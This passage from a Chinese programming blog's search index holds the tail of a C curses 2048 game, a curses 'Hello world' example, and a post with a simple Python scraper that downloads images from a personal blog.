class="number">0</span>) </span><br><span class="line">                        {</span><br><span class="line">                            <span class="keyword">continue</span>;</span><br><span class="line">                        } <span class="keyword">else</span> </span><br><span class="line">                        {</span><br><span class="line">                            <span class="keyword">for</span>(i = x; (i &lt; <span class="number">3</span>) &amp;&amp; (a[y][i+<span class="number">1</span>] == <span class="number">0</span>); i++) </span><br><span class="line">                            {</span><br><span class="line">                                a[y][i+<span class="number">1</span>] = a[y][i];</span><br><span class="line">                                a[y][i] = <span class="number">0</span>;</span><br><span class="line">                                move = <span class="number">1</span>;</span><br><span class="line">                            }</span><br><span class="line">                        }</span><br><span class="line">                    }</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">119</span>:   <span class="comment">// &#x4E0A; </span></span><br><span class="line">            <span class="keyword">case</span> <span class="number">107</span>:   </span><br><span class="line">            <span class="keyword">case</span> <span class="number">65</span>:    </span><br><span class="line">                <span class="keyword">for</span>(x = <span class="number">0</span>; x &lt; <span class="number">4</span>; x++)</span><br><span class="line">                    <span class="keyword">for</span>(y = <span class="number">0</span>; y &lt; <span class="number">4</span>; ) </span><br><span class="line">                    {</span><br><span class="line">                        <span class="keyword">if</span>(a[y][x] == <span class="number">0</span>)</span><br><span class="line">                        {</span><br><span class="line">                            y++;</span><br><span class="line">                            <span class="keyword">continue</span>;</span><br><span class="line">                        } </span><br><span class="line">                        <span class="keyword">else</span> </span><br><span class="line">                        {</span><br><span class="line">                            <span class="keyword">for</span>(i = y + <span class="number">1</span>; i &lt; <span class="number">4</span>; i++) </span><br><span class="line">                            {</span><br><span class="line">                                <span class="keyword">if</span>(a[i][x] == <span class="number">0</span>) </span><br><span class="line">                                {</span><br><span class="line">                                    <span class="keyword">continue</span>;</span><br><span class="line">                                } </span><br><span class="line">                                <span class="keyword">else</span> <span class="keyword">if</span>(a[y][x] == a[i][x]) </span><br><span class="line">                                {</span><br><span class="line">                                    a[y][x] += a[i][x];</span><br><span class="line">                                    a[i][x] = <span class="number">0</span>;</span><br><span class="line">                                    empty++;</span><br><span class="line">                                    <span class="keyword">break</span>;</span><br><span class="line">                                } <span class="keyword">else</span> </span><br><span class="line">                                {</span><br><span class="line">                                    <span class="keyword">break</span>;</span><br><span class="line">                                }</span><br><span class="line">                            }</span><br><span class="line">                            y = i;</span><br><span class="line">                        }</span><br><span class="line">                    }</span><br><span class="line">                <span class="keyword">for</span>(x = <span class="number">0</span>; x &lt; <span class="number">4</span>; x++)</span><br><span class="line">                    <span class="keyword">for</span>(y = <span class="number">0</span>; y &lt; <span class="number">4</span>; y++) </span><br><span class="line">                    {</span><br><span class="line">                        <span class="keyword">if</span>(a[y][x] == <span class="number">0</span>) </span><br><span class="line">                        {</span><br><span class="line">                            <span class="keyword">continue</span>;</span><br><span class="line">                        } </span><br><span class="line">                        <span class="keyword">else</span></span><br><span class="line">                        {</span><br><span class="line">                            <span class="keyword">for</span>(i = y; (i &gt; <span class="number">0</span>) &amp;&amp; (a[i<span class="number">-1</span>][x] == <span class="number">0</span>); i--) </span><br><span class="line">                            {</span><br><span class="line">                                a[i<span class="number">-1</span>][x] = a[i][x];                             </span><br><span class="line">                                a[i][x] = <span class="number">0</span>;</span><br><span class="line">                                move = <span class="number">1</span>;</span><br><span class="line">                            }</span><br><span class="line">                        }</span><br><span class="line">                    }</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">115</span>:   <span class="comment">// &#x4E0B;</span></span><br><span class="line">            <span class="keyword">case</span> <span class="number">106</span>:   </span><br><span class="line">            <span class="keyword">case</span> <span class="number">66</span>:    </span><br><span class="line">                <span class="keyword">for</span>(x = <span class="number">0</span>; x &lt; <span class="number">4</span>; x++)</span><br><span class="line">                    <span class="keyword">for</span>(y = <span class="number">3</span>; y &gt;= <span class="number">0</span>; ) </span><br><span class="line">                    {</span><br><span class="line">                        <span class="keyword">if</span>(a[y][x] == <span class="number">0</span>) </span><br><span class="line">                        {</span><br><span class="line">                            y--;</span><br><span class="line">                            <span class="keyword">continue</span>;</span><br><span class="line">                        } </span><br><span class="line">                        <span class="keyword">else</span> </span><br><span class="line">                        {</span><br><span class="line">                            <span class="keyword">for</span>(i = y - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--) </span><br><span class="line">                            {</span><br><span class="line">                                <span class="keyword">if</span>(a[i][x] == <span class="number">0</span>) </span><br><span class="line">                                {</span><br><span class="line">                                    <span class="keyword">continue</span>;</span><br><span class="line">                                } </span><br><span class="line">                                <span class="keyword">else</span> <span class="keyword">if</span>(a[y][x] == a[i][x])</span><br><span class="line">                                {</span><br><span class="line">                                    a[y][x] += a[i][x];</span><br><span class="line">                                    a[i][x] = <span class="number">0</span>;</span><br><span class="line">                                    empty++;</span><br><span class="line">                                    <span class="keyword">break</span>;</span><br><span class="line">                                } </span><br><span class="line">                                <span class="keyword">else</span></span><br><span class="line">                                {</span><br><span class="line">                                    <span class="keyword">break</span>;</span><br><span class="line">                                }</span><br><span class="line">                            }</span><br><span class="line">                            y = i;</span><br><span class="line">                        }</span><br><span class="line">                    }</span><br><span class="line">                <span class="keyword">for</span>(x = <span class="number">0</span>; x &lt; <span class="number">4</span>; x++)</span><br><span class="line">                    <span class="keyword">for</span>(y = <span class="number">3</span>; y &gt;= <span class="number">0</span>; y--) </span><br><span class="line">                    {</span><br><span class="line">                        <span class="keyword">if</span>(a[y][x] == <span class="number">0</span>) </span><br><span class="line">                        {</span><br><span class="line">                            <span class="keyword">continue</span>;</span><br><span class="line">                        } </span><br><span class="line">                        <span class="keyword">else</span> </span><br><span class="line">                        {</span><br><span class="line">                            <span class="keyword">for</span>(i = y; (i &lt; <span class="number">3</span>) &amp;&amp; (a[i+<span class="number">1</span>][x] == <span class="number">0</span>); i++) </span><br><span class="line">                            {</span><br><span class="line">                                a[i+<span class="number">1</span>][x] = a[i][x];                               </span><br><span class="line">                                a[i][x] = <span class="number">0</span>;</span><br><span class="line">                                move = <span class="number">1</span>;</span><br><span class="line">                            }</span><br><span class="line">                        }</span><br><span class="line">                    }</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&apos;Q&apos;</span>:</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&apos;q&apos;</span>:</span><br><span class="line">                game_over();</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">if</span>(empty &lt;= <span class="number">0</span>)</span><br><span class="line">            game_over();</span><br><span class="line">        <span class="keyword">if</span>((empty != old_empty) || (move == <span class="number">1</span>)) </span><br><span class="line">        { </span><br><span class="line">            <span class="keyword">do</span>{</span><br><span class="line">                new_x = rand() % <span class="number">4</span>;</span><br><span class="line">                new_y = rand() % <span class="number">4</span>;</span><br><span class="line">            }<span class="keyword">while</span>(a[new_y][new_x] != <span class="number">0</span>);       <span class="comment">// &#x6807;&#x8BB0;&#x968F;&#x673A;&#x4EA7;&#x751F;&#x6570;&#x5B57;&#x4E3A;0&#x7684;&#x4F4D;&#x7F6E;</span></span><br><span class="line">            cnt_value(&amp;new_y, &amp;new_x);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">do</span> {</span><br><span class="line">                temp = rand() % <span class="number">4</span>;</span><br><span class="line">            }<span class="keyword">while</span>(temp == <span class="number">0</span> || temp == <span class="number">2</span>);</span><br><span class="line">            a[new_y][new_x] = temp + <span class="number">1</span>;     <span class="comment">// &#x5728;&#x627E;&#x7684;&#x7684;&#x4F4D;&#x7F6E;&#x9644;&#x4E0A;&#x65B0;&#x7684;&#x6570;&#x5B57;1&#x6216;3</span></span><br><span class="line">            empty--;</span><br><span class="line">        }</span><br><span class="line">        draw();     <span class="comment">// &#x5237;&#x65B0;&#x9875;&#x9762;</span></span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">cnt_one</span><span class="params">(<span class="keyword">int</span> y, <span class="keyword">int</span> x)</span>       <span class="comment">// &#x67E5;&#x627E;&#x8BE5;&#x4F4D;&#x7F6E;&#x5468;&#x56F4;&#x7A7A;&#x4F4D;&#x7F6E;&#x7684;&#x4E2A;&#x6570;</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    <span class="keyword">int</span> value = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(y - <span class="number">1</span> &gt; <span class="number">0</span>)  </span><br><span class="line">        a[y<span class="number">-1</span>][x] ? <span class="number">0</span> : value++;</span><br><span class="line">    <span class="keyword">if</span>(y + <span class="number">1</span> &lt; <span class="number">4</span>)</span><br><span class="line">        a[y+<span class="number">1</span>][x] ? <span class="number">0</span> : value++;</span><br><span class="line">    <span class="keyword">if</span>(x - <span class="number">1</span> &gt;= <span class="number">0</span>)</span><br><span class="line">        a[y][x<span class="number">-1</span>] ? <span class="number">0</span> : value++;</span><br><span class="line">    <span class="keyword">if</span>(x + <span class="number">1</span> &lt; <span class="number">4</span>)</span><br><span class="line">        a[y][x+<span class="number">1</span>] ? <span class="number">0</span> : value++;</span><br><span class="line">    <span class="keyword">if</span>(y - <span class="number">1</span> &gt;= <span class="number">0</span> &amp;&amp; x - <span class="number">1</span> &gt;= <span class="number">0</span>)</span><br><span class="line">        a[y<span class="number">-1</span>][x<span class="number">-1</span>] ? <span class="number">0</span> : value++;</span><br><span class="line">    <span class="keyword">if</span>(y - <span class="number">1</span> &gt;= <span class="number">0</span> &amp;&amp; x + <span class="number">1</span> &lt; <span class="number">4</span>)</span><br><span class="line">        a[y<span class="number">-1</span>][x+<span class="number">1</span>] ? <span class="number">0</span> : value++;</span><br><span class="line">    <span class="keyword">if</span>(y + <span class="number">1</span> &lt; <span class="number">4</span> &amp;&amp; x - <span class="number">1</span> &gt;= <span class="number">0</span>)</span><br><span class="line">        a[y+<span class="number">1</span>][x<span class="number">-1</span>] ? <span class="number">0</span> : value++;</span><br><span class="line">    <span class="keyword">if</span>(y + <span class="number">1</span> &lt; <span class="number">4</span> &amp;&amp; x + <span class="number">1</span> &lt; <span class="number">4</span>)</span><br><span class="line">        a[y+<span class="number">1</span>][x+<span class="number">1</span>] ? <span class="number">0</span> : value++;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> value;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">cnt_value</span><span class="params">(<span class="keyword">int</span> *new_y, <span class="keyword">int</span> *new_x)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    <span class="keyword">int</span> max_x, max_y, x, y, value;</span><br><span class="line">    <span class="keyword">int</span> max = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    max = cnt_one(*new_y, *new_x);      <span class="comment">// &#x8BE5;&#x6570;&#x5B57;&#x4E3A;0&#x7684;&#x5143;&#x7D20;&#x7684;&#x5468;&#x56F4;&#x7A7A;&#x4F4D;&#x7F6E;&#x5143;&#x7D20;&#x7684;&#x4E2A;&#x6570;</span></span><br><span class="line">    <span class="keyword">for</span>(y = <span class="number">0</span>; y &lt; <span class="number">4</span>; y++)</span><br><span class="line">        <span class="keyword">for</span>(x = <span class="number">0</span>; x &lt; <span class="number">4</span>; x++) </span><br><span class="line">        {</span><br><span class="line">            <span class="keyword">if</span>(!a[y][x])                <span class="comment">// &#x904D;&#x5386;&#x5176;&#x4ED6;&#x6570;&#x5B57;&#x4E3A;0&#x7684;&#x5143;&#x7D20;</span></span><br><span class="line">            {</span><br><span class="line">                value = cnt_one(y, x);</span><br><span class="line">                <span class="keyword">if</span>(value &gt; max &amp;&amp; old_y != y &amp;&amp; old_x != x)        <span class="comment">// &#x627E;&#x5230;&#x5468;&#x56F4;&#x7A7A;&#x4F4D;&#x7F6E;&#x5143;&#x7D20;&#x6700;&#x591A;&#x7684;&#x4E00;&#x4E2A;&#x4F4D;&#x7F6E;</span></span><br><span class="line">                {  </span><br><span class="line">                    *new_y = y;</span><br><span class="line">                    *new_x = x;</span><br><span class="line">                    old_x = x;</span><br><span class="line">                    old_y = y;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                }</span><br><span class="line">            }</span><br><span class="line">        }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">game_over</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    sleep(<span class="number">1</span>);</span><br><span class="line">    endwin();</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>&#x809A;&#x5B50;&#x6709;&#x70B9;&#x997F;&#x4E86;&#xFF0C;&#x5403;&#x996D;&#x53BB;&#x4E86;&#xFF5E;&#xFF5E;&#xFF5E;&#xFF5E;</p><hr><p>&#x4ECA;&#x5929;&#x7ED9;&#x4EE3;&#x7801;&#x589E;&#x52A0;&#x4E86;&#x6CE8;&#x91CA;&#xFF0C;&#x5BF9;&#x6574;&#x4E2A;&#x6E38;&#x620F;&#x7684;&#x5DE5;&#x4F5C;&#x539F;&#x7406;&#x7B97;&#x662F;&#x6709;&#x4E86;&#x4E00;&#x4E2A;&#x5927;&#x81F4;&#x7684;&#x4E86;&#x89E3;&#xFF0C;&#x636E;&#x8BF4;&#x82E5;&#x679C;&#x5206;&#x6570;&#x5230;&#x8FBE;2048&#x7684;&#x65F6;&#x5019;&#xFF0C;&#x4F1A;&#x6709;&#x60CA;&#x559C;&#xFF01;&#xFF01;&#xFF01;&#xFF01;<br>&#x53E6;&#x5916;&#x8FD8;&#x5BF9;Linux&#x56FE;&#x5F62;&#x754C;&#x9762;&#x7F16;&#x7A0B;&#x5E93;&#xFF08;curses&#x5E93;&#xFF09;&#x6709;&#x4E86;&#x4E00;&#x4E9B;&#x4E86;&#x89E3;&#x3002;</p><p>&#x8FD9;&#x91CC;&#x6709;&#x4E00;&#x4E2A;&#x7B80;&#x5355;&#x4F7F;&#x7528;&#x8BE5;&#x5E93;&#x7684;&#x4F8B;&#x5B50;&#x3002;<br></p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt; </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt; </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;curses.h&gt; </span></span></span><br><span class="line">   </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span>  </span>{ </span><br><span class="line">    initscr(); </span><br><span class="line">    move( <span class="number">15</span>, <span class="number">15</span> ); </span><br><span class="line">    printw( <span class="string">&quot;%s&quot;</span>, <span class="string">&quot;Hello world&quot;</span> ); </span><br><span class="line">    refresh(); </span><br><span class="line">    sleep(<span class="number">10</span>); </span><br><span class="line">    endwin(); </span><br><span class="line">    <span class="built_in">exit</span>(EXIT_SUCCESS);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> c++ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> c++ </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>DIY python 1</title>
      <link href="/2018/09/27/DIY-python-1/"/>
      <url>/2018/09/27/DIY-python-1/</url>
      
        <content type="html"><![CDATA[<h1 id="&#x4E00;&#x4E2A;&#x7B80;&#x5355;&#x7684;&#x722C;&#x866B;"><a href="#&#x4E00;&#x4E2A;&#x7B80;&#x5355;&#x7684;&#x722C;&#x866B;" class="headerlink" title="&#x4E00;&#x4E2A;&#x7B80;&#x5355;&#x7684;&#x722C;&#x866B;"></a>&#x4E00;&#x4E2A;&#x7B80;&#x5355;&#x7684;&#x722C;&#x866B;</h1><p>&#x4E00;&#x76F4;&#x60F3;&#x7528;&#x722C;&#x866B;&#x6765;&#x722C;&#x53D6;&#x4E00;&#x4E0B;&#x522B;&#x4EBA;&#x7F51;&#x7AD9;&#x4E0A;&#x7684;&#x81EA;&#x5DF1;&#x559C;&#x6B22;&#x7684;&#x56FE;&#x7247;&#xFF0C;&#x6B63;&#x597D;&#x6700;&#x8FD1;&#x53C8;&#x5728;&#x5B66;&#x4E60;&#x7F51;&#x7EDC;&#x722C;&#x866B;&#x7684;&#x77E5;&#x8BC6;&#xFF0C;&#x6240;&#x4EE5;&#x5C31;&#x81EA;&#x5DF1;&#x52A8;&#x624B;&#x5B9E;&#x8DF5;&#x4E86;&#x4E00;&#x4E0B;&#x3002;&#x6548;&#x679C;&#x8FD8;&#x4E0D;&#x9519;^_^<br>&#x6311;&#x4E24;&#x5F20;&#x597D;&#x770B;&#x7684;&#x56FE;&#x7247;&#x5148;&#x8D34;&#x4E0A;</p><p><img src="http://p4wiqzx0i.bkt.clouddn.com/pixiv54752415-1024x481.jpg" alt=""><br><a id="more"></a><br><img src="http://p4wiqzx0i.bkt.clouddn.com/%E6%B0%B4%E4%B8%8A%E9%83%BD%E5%B8%82-floating-city_62101308-1024x512.jpg" alt=""></p><p>&#x6548;&#x679C;&#x8FD8;&#x4E0D;&#x9519;&#x5427;&#x3002;</p><h2 id="&#x653E;&#x7801;&#x8FC7;&#x6765;"><a href="#&#x653E;&#x7801;&#x8FC7;&#x6765;" class="headerlink" title="&#x653E;&#x7801;&#x8FC7;&#x6765;"></a>&#x653E;&#x7801;&#x8FC7;&#x6765;</h2><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"></span><br><span class="line">headers = {<span class="string">&quot;User-Agent&quot;</span>:<span class="string">&quot;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.90 Safari/537.36&quot;</span> }</span><br><span class="line"></span><br><span class="line">unseen = set()</span><br><span class="line">seen = set</span><br><span class="line"></span><br><span class="line">home_page_url = <span class="string">&quot;https://2heng.xin/&quot;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_page_url</span><span class="params">(page_url)</span>:</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        print(<span class="string">&quot;page_url is &quot;</span> + page_url)</span><br><span class="line">        html = requests.get(page_url, headers=headers)</span><br><span class="line">        soup = BeautifulSoup(html.text, features=<span class="string">&quot;html.parser&quot;</span>)</span><br><span class="line">        url = soup.find(<span class="string">&quot;div&quot;</span>, {<span class="string">&quot;id&quot;</span>: <span class="string">&quot;pagination&quot;</span>}).find(<span class="string">&quot;a&quot;</span>, href=re.compile(<span class="string">&quot;(^(https://2heng.xin/))&quot;</span>))</span><br><span class="line">        page_url = url[<span class="string">&apos;href&apos;</span>]</span><br><span class="line">        get_img_url(page_url)</span><br><span class="line">        get_page_url(page_url)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        print(<span class="string">&quot;page_url finished!!&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_img_url</span><span class="params">(cur_url)</span>:</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        curhtml = requests.get(cur_url, headers=headers, stream=<span class="keyword">True</span>)</span><br><span class="line">        cursoup = BeautifulSoup(curhtml.text, features=<span class="string">&quot;html.parser&quot;</span>)</span><br><span class="line">        cururls = cursoup.find(<span class="string">&quot;div&quot;</span>, {<span class="string">&quot;class&quot;</span>: <span class="string">&quot;site-content&quot;</span>}).findAll(<span class="string">&quot;img&quot;</span>, {<span class="string">&quot;class&quot;</span>: <span class="string">&quot;lazyload&quot;</span>})</span><br><span class="line">        img_num = download_img(cururls)</span><br><span class="line">        print(img_num)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        print(<span class="string">&quot;get_img_url finished!!!!&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">download_img</span><span class="params">(img_urls)</span>:</span></span><br><span class="line">    img_num = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> img_url <span class="keyword">in</span> img_urls:</span><br><span class="line">        img_num += <span class="number">1</span></span><br><span class="line">        url = img_url[<span class="string">&apos;data-src&apos;</span>]</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            r = requests.get(url, stream=<span class="keyword">True</span>)</span><br><span class="line">            img_name = url.split(<span class="string">&apos;/&apos;</span>)[<span class="number">-1</span>]</span><br><span class="line">            <span class="keyword">with</span> open(<span class="string">&apos;./img/MASHIRO/%s&apos;</span> % img_name, <span class="string">&apos;wb&apos;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                <span class="keyword">for</span> chunk <span class="keyword">in</span> r.iter_content(chunk_size=<span class="number">128</span>):</span><br><span class="line">                    f.write(chunk)</span><br><span class="line">            print(<span class="string">&quot;finished download &quot;</span> + url)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            print(<span class="string">&quot;this image have some problem!&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> img_num</span><br><span class="line"></span><br><span class="line">get_page_url(home_page_url)</span><br></pre></td></tr></tbody></table></figure><p>&#x5176;&#x5B9E;&#x4EE3;&#x7801;&#x5F88;&#x7B80;&#x5355;&#xFF0C;&#x53EA;&#x4E0D;&#x8FC7;&#x8FD9;&#x662F;&#x6211;&#x7B2C;&#x4E00;&#x6B21;&#x52A8;&#x624B;&#x6765;&#x7528;&#x4EE3;&#x7801;&#x5E2E;&#x81EA;&#x5DF1;&#x5B8C;&#x6210;&#x4E00;&#x4EF6;&#x4E8B;&#x60C5;&#xFF0C;&#x6240;&#x4EE5;&#x5C31;&#x628A;&#x4EE3;&#x7801;&#x8D34;&#x4E86;&#x51FA;&#x6765;&#x3002;&#x4EE3;&#x7801;&#x5199;&#x7684;&#x6BD4;&#x8F83;&#x51CC;&#x4E71;&#xFF0C;&#x5982;&#x6709;&#x9519;&#x8BEF;&#x8FD8;&#x6B22;&#x8FCE;&#x6307;&#x6B63;@-@</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
  
  
</search>
